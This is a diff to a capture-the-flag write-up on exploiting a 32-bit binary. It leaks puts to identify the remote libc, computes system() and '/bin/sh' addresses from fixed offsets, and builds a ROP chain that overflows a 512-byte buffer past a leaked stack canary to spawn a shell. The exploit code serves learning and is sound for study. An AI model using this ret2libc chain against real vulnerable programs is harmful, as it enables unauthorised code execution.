@@ -606,19 +606,36 @@ we have leaked the `puts_plt` it lives in the 0xe0000000–0xf0000000 range, whi
 
 4. **Compute `system()` and `/bin/sh` Addresses**
 
-As i have told you that this is the easies part but unfortunatelly 
+As i have told you that this is the easies part but unfortunately for rmote server we are not prodided with the libc so to find that first we need to leak the puts address and then find the correct corresponding match of the libc and use that
+
+we will use [libc.rip](https://libc.rip/) 
+
+we will enter the symbol name and the address of it which we haved leaked 
+
+
+![right libc](./img/right_libc.png)
+
+
+we will select the first libc 
+
+
+![symbols](./img/symbols.png)
+
+now we can use these symbols 
+
+
+
 
 Using the local libc ELF:
 
 ```python
-binsh_offset = next(libc.search(b'/bin/sh'))
-libc_base    = puts_leak - libc.symbols['puts']
+libc_base = puts - 0x67560
+system_addr = libc_base + 0x3cf10
+binsh_addr = libc_base + 0x17b9db
 
-system_addr  = libc_base + libc.symbols['system']
-print("system() address:", hex(system_addr))
-
-binsh_addr   = libc_base + binsh_offset
-print("'/bin/sh' address:", hex(binsh_addr))
+print(f"[+] libc base: {hex(libc_base)}")
+print(f"[+] system(): {hex(system_addr)}")
+print(f"[+] /bin/sh: {hex(binsh_addr)}")
 ```
 
 * `libc_base` is the start of libc in memory.
@@ -626,3 +643,48 @@ print("'/bin/sh' address:", hex(binsh_addr))
 * `binsh_addr` points to the string `"/bin/sh"` in libc.
 
 ---
+
+5. **Constructing the Final ROP Chain** – to execute `system("/bin/sh")` and spawn a shell.
+
+Construct the **final ROP chain**:
+
+```python
+p.recvuntil(b"What number would you like to guess?")
+p.sendline(magic_number)   # trigger win() again
+
+payload = (
+    b"A"*512 +
+    p32(canary) +
+    b"A"*12 +
+    p32(system_addr) +
+    p32(elf.functions['win'].address) +
+    p32(binsh_addr)
+)
+
+```
+
+**Explanation:**
+
+* Overflow buffer: 512 bytes
+* Canary: bypass stack protection
+* Padding: 12 bytes
+* `system_addr`: executes system("/bin/sh")
+* Return address: can point to `win()` or anywhere safe
+* `binsh_addr`: argument to `system()`
+
+Send the payload:
+
+```python
+p.sendline(payload)
+p.recvlines(2)
+p.interactive()
+```
+
+
+**Result:** Spawns a **local shell** with the privileges of the binary.
+
+---
+
+![remote result](./img/remote_result.png)
+
+
